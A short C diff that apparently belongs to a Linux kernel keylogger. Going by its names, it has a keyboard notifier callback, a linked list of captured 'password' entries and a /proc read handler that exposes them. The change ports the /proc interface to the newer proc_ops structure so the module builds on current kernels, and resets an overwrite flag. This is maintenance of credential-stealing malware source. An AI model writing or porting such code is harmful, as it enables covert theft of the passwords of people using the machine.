@@ -91,6 +91,7 @@ void ll_destructor(struct password** head){
                         curr = next;
                 }
         }
+	overwrite = false;
 }
 
 
@@ -98,8 +99,8 @@ ssize_t read_password(struct file *filp,char *buf,size_t count,loff_t *offp ) {
 	return 0;
 }
 
-struct file_operations proc_fops = {
-	read: read_password,
+struct proc_ops proc_fops = {
+	proc_read: read_password,
 };
 
 int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data){
